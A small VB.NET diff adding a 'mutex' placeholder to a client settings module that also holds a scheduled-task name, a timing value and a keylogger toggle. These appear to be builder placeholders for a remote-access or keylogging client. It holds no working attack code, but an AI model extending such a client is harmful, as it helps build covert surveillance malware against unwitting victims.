@@ -12,5 +12,6 @@ Namespace Client
 		Public taskName As String = "%C%"
 		Public time As String = "%1%"
 		Public offKeylog As String = "False"
+		Public mutex As String = "%MUTEX%"
 	End Module
 End Namespace
